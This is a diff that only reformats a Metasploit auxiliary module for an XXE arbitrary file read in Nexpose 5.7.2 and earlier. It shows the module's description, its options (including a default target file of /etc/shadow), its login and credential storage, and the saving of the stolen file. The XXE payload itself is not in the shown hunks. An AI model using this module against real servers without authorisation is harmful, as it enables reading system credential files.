@@ -10,37 +10,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Nexpose XXE Arbitrary File Read',
-      'Description' => %q{
-        Nexpose v5.7.2 and prior is vulnerable to a XML External Entity attack via a number
-        of vectors. This vulnerability can allow an attacker to a craft special XML that
-        could read arbitrary files from the filesystem. This module exploits the
-        vulnerability via the XML API.
-      },
-      'Author' =>
-        [
-        'Brandon Perry <bperry.volatile[at]gmail.com>', # Initial discovery and Metasploit module
-        'Drazen Popovic <drazen.popvic[at]infigo.hr>',  # Independent discovery, alternate vector
-        'Bojan Zdrnja <bojan.zdrnja[at]infigo.hr>'      # Independently reported
+    super(
+      update_info(
+        info,
+        'Name' => 'Nexpose XXE Arbitrary File Read',
+        'Description' => %q{
+          Nexpose v5.7.2 and prior is vulnerable to a XML External Entity attack via a number
+          of vectors. This vulnerability can allow an attacker to a craft special XML that
+          could read arbitrary files from the filesystem. This module exploits the
+          vulnerability via the XML API.
+        },
+        'Author' => [
+          'Brandon Perry <bperry.volatile[at]gmail.com>', # Initial discovery and Metasploit module
+          'Drazen Popovic <drazen.popvic[at]infigo.hr>',  # Independent discovery, alternate vector
+          'Bojan Zdrnja <bojan.zdrnja[at]infigo.hr>'      # Independently reported
         ],
-      'License' => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'https://blog.rapid7.com/2013/08/16/r7-vuln-2013-07-24' ]
         ],
-      'DefaultOptions' => {
-        'SSL' => true
-      }
-    ))
+        'DefaultOptions' => {
+          'SSL' => true
+        }
+      )
+    )
 
-  register_options(
-    [
-      Opt::RPORT(3780),
-      OptString.new('USERNAME', [true, "The Nexpose user", nil]),
-      OptString.new('PASSWORD', [true, "The Nexpose password", nil]),
-      OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
-    ])
+    register_options(
+      [
+        Opt::RPORT(3780),
+        OptString.new('USERNAME', [true, "The Nexpose user", nil]),
+        OptString.new('PASSWORD', [true, "The Nexpose password", nil]),
+        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
+      ]
+    )
   end
 
   def run
@@ -55,14 +57,13 @@ class MetasploitModule < Msf::Auxiliary
       nsc.login
 
       connection_details = {
-          module_fullname: self.fullname,
-          username: user,
-          private_data: pass,
-          private_type: :password,
-          status: Metasploit::Model::Login::Status::UNTRIED
+        module_fullname: self.fullname,
+        username: user,
+        private_data: pass,
+        private_type: :password,
+        status: Metasploit::Model::Login::Status::UNTRIED
       }.merge(service_details)
       create_credential_and_login(connection_details)
-
     rescue
       print_error("Error authenticating, check your credentials")
       return
@@ -123,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    path = store_loot('nexpose.file','text/plain', rhost, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{rhost}")
+    path = store_loot('nexpose.file', 'text/plain', rhost, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{rhost}")
     print_good("File saved to path: " << path)
   end
 end
